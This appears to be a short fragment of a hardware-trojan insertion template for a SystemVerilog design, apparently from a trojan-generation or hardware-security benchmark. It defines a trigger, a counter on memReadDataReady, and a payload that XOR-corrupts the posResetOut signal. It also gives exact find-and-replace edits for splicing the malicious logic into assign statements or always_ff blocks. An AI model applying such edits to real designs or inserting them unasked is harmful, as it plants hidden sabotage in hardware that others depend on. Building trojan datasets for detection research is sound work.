 ...
 *   
 * Trigger: Counter on memReadDataReady
 * Payload: Corrupt posResetOut with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt posResetOut with XOR
//
// Integration Script Must Modify:
//
// IF posResetOut is assigned:
//   Find: assign posResetOut = data_value;
//   Replace: assign posResetOut = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF posResetOut is in always_ff:
//   Find: posResetOut <= data_value;
//   Replace: posResetOut <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
